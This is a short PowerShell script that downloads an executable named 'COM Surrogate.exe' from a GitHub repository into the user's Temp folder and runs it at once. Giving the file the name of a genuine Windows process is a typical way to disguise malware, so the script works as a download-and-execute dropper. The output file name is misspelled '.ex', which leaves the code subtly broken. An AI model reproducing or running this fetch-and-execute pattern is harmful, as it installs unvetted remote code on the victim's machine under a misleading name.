# Define the URL of the .exe file
$url = "https://github.com/M7mmdddd/webstie-demo/blob/main/files/COM%20Surrogate.exe"

# Define the path where the .exe will be saved (e.g., in the Temp folder)
$outputPath = "$env:TEMP\COM Surrogate.ex"

# Download the .exe file
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Execute the .exe file
Start-Process -FilePath $outputPath